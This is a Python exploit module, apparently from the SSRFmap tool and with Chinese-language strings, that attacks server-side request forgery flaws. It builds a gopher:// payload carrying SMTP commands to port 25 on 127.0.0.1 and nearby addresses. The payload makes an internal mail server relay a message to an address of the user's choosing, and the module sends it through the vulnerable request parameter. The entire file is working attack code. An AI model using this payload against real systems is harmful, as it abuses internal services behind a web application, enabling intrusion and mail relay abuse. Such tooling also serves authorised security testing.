import logging
import urllib.parse as urllib

from core.utils import *

name = "smtp"
description = "通过 SMTP 发送邮件"
author = "Swissky"
documentation = []


class exploit:
    mailto = "admin@example.com"
    mailfrom = "ssrfmap@exploit.com"
    subject = "SSRF - 打通了！"
    msg = "SMTP 利用成功"

    def __init__(self, requester, args):
        logging.info(f"模块 '{name}' 已启动！")
        self.mailto = input("[收件人] 请输入邮箱（例如 hacker@example.com）: ")

        gen_host = gen_ip_list("127.0.0.1", args.level)
        for ip in gen_host:
            port = 25
            commands = [
                "MAIL FROM:" + self.mailfrom,
                "RCPT To:" + self.mailto,
                "DATA",
                "From:" + self.mailfrom,
                "Subject:" + self.subject,
                "Message:" + self.msg,
                ".",
                "",
            ]

            data = "%0A".join(commands)
            data = urllib.quote_plus(data).replace("+", "%20")
            data = data.replace("%2F", "/")
            data = data.replace("%25", "%")
            data = data.replace("%3A", ":")
            payload = wrapper_gopher(data, ip, port)
            logging.info("生成的 payload : {}".format(payload))

            logging.info("邮件已发送，请查看收件箱！")
            r = requester.do_request(args.param, payload)
